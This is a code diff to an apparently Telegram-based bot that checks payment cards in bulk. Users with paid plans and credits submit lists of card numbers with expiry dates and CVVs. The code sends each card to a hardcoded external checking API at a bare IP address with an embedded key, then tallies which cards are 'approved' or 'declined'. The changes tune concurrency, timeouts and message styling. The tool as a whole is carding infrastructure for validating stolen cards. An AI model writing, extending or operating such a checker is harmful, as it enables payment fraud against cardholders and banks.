@@ -1352,66 +1352,67 @@ async def check_cards_background(cards_to_check, user_id, user_first_name, proce
     results = []
     total_cards = len(cards_to_check)
 
+    semaphore = asyncio.Semaphore(5)  # limit to 5 concurrent requests
+
     async def check_card(session, raw):
         nonlocal approved_count, declined_count, checked_count, error_count
 
-        parts = raw.split("|")
-        if len(parts) != 4:
+        async with semaphore:  # acquire semaphore before running
+            parts = raw.split("|")
+            if len(parts) != 4:
+                checked_count += 1
+                error_count += 1
+                return f"❌ Invalid card format: `{raw}`"
+
+            # Normalize year (YYYY → YY)
+            if len(parts[2]) == 4:
+                parts[2] = parts[2][-2:]
+            cc_normalized = "|".join(parts)
+
+            api_url = f"http://31.97.66.195:8000/?key=k4linuxx&card={cc_normalized}"
+
+            try:
+                async with session.get(api_url, timeout=40) as resp:
+                    if resp.status != 200:
+                        raise Exception(f"HTTP {resp.status}")
+                    try:
+                        data = await resp.json()
+                    except Exception as e:
+                        raw_text = await resp.text()
+                        print(f"[DEBUG] JSON decode failed for {cc_normalized}: {e}, raw={raw_text[:200]}...")
+                        raise Exception(f"JSON decode failed: {e}")
+            except Exception as e:
+                checked_count += 1
+                error_count += 1
+                return f"❌ API Error for card `{cc_normalized}`: {escape_markdown(str(e) or 'Unknown', version=2)}"
+
+            api_response = data.get("status", "Unknown")
+            api_response_clean = normalize_text(
+                re.sub(r'[\U00010000-\U0010ffff]', '', api_response).strip()
+            )
+
+            api_response_lower = api_response_clean.lower()
+            if "approved" in api_response_lower:
+                approved_count += 1
+            elif "declined" in api_response_lower or "incorrect" in api_response_lower:
+                declined_count += 1
+
             checked_count += 1
-            error_count += 1
-            return f"❌ Invalid card format: `{raw}`"
 
-        # Normalize year (YYYY → YY)
-        if len(parts[2]) == 4:
-            parts[2] = parts[2][-2:]
-        cc_normalized = "|".join(parts)
-
-        api_url = f"http://31.97.66.195:8000/?key=k4linuxx&card={cc_normalized}"
-
-        try:
-            async with session.get(api_url, timeout=25) as resp:
-                if resp.status != 200:
-                    raise Exception(f"HTTP {resp.status}")
-                try:
-                    data = await resp.json()
-                except Exception as e:
-                    raw_text = await resp.text()
-                    print(f"[DEBUG] JSON decode failed for {cc_normalized}: {e}, raw={raw_text[:200]}...")
-                    raise Exception(f"JSON decode failed: {e}")
-        except Exception as e:
-            checked_count += 1
-            error_count += 1
-            return f"❌ API Error for card `{cc_normalized}`: {escape_markdown(str(e) or 'Unknown', version=2)}"
-
-        api_response = data.get("status", "Unknown")
-        api_response_clean = normalize_text(
-            re.sub(r'[\U00010000-\U0010ffff]', '', api_response).strip()
-        )
-
-        # Decide counts only (no added emoji)
-        api_response_lower = api_response_clean.lower()
-        if "approved" in api_response_lower:
-            approved_count += 1
-        elif "declined" in api_response_lower or "incorrect" in api_response_lower:
-            declined_count += 1
-
-        checked_count += 1
-
-        return (
-            f"`{cc_normalized}`\n"
-            f"𝐒𝐭𝐚𝐭𝐮𝐬 ➳ {escape_markdown(api_response_clean, version=2)}"
-        )
+            return (
+                f"`{cc_normalized}`\n"
+                f"𝐒𝐭𝐚𝐭𝐮𝐬 ➳ {escape_markdown(api_response_clean, version=2)}"
+            )
 
     async with aiohttp.ClientSession() as session:
         tasks = [check_card(session, raw) for raw in cards_to_check]
-        update_interval = 3  # seconds
+        update_interval = 3
         last_update = time.time()
 
         for coro in asyncio.as_completed(tasks):
             result = await coro
             results.append(result)
 
-            # update every 3s
             if time.time() - last_update >= update_interval:
                 last_update = time.time()
                 current_summary = (
@@ -1476,9 +1477,9 @@ async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # Block if no active plan or no credits
         if plan.lower() == "free" or credits <= 0:
             await update.effective_message.reply_text(
-                "🚫 You cannot use this command in *private chat*.\n"
-                "👉 You need an **active paid plan with credits**.\n"
-                "💳 Please buy a subscription to use `/mchk`."
+                "🚫 You cannot use this command in private chat.\n"
+                "👉 You need an active paid plan with credits.\n"
+                "💳 Please buy a subscription to use it."
             )
             return
 
@@ -1540,7 +1541,7 @@ async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
 
     # ✅ initial processing message
-    processing_msg = await update.effective_message.reply_text("🔎 Processing...")
+    processing_msg = await update.effective_message.reply_text("🔎𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜...")
     start_time = time.time()
 
     # ✅ run background task
@@ -1691,7 +1692,7 @@ async def check_cards_background(cards_to_check, user_id, user_first_name, proce
         await processing_msg.edit_text("❌ You don’t have enough credits.")
         return
 
-    semaphore = asyncio.Semaphore(10)  # Limit concurrent requests to 10
+    semaphore = asyncio.Semaphore(5)  # Limit concurrent requests to 10
 
     async with aiohttp.ClientSession() as session:
         async def fetch_card(card):
@@ -1701,7 +1702,7 @@ async def check_cards_background(cards_to_check, user_id, user_first_name, proce
                 # The API URL is a placeholder.
                 api_url = f"http://31.97.66.195:8000/?key=k4linuxx&card={card}"
                 try:
-                    async with session.get(api_url, timeout=25) as resp:
+                    async with session.get(api_url, timeout=40) as resp:
                         data = await resp.json()
                         status = data.get("status", "Unknown ❓")
                 except Exception as e:
@@ -1840,7 +1841,7 @@ async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     # Send initial processing message
     processing_msg = await update.effective_message.reply_text(
-        f"🔎 Processing {len(cards_to_check)} cards..."
+        f"🔎𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 {len(cards_to_check)} 𝑪𝒂𝒓𝒅𝒔..."
     )
     start_time = time.time()
 
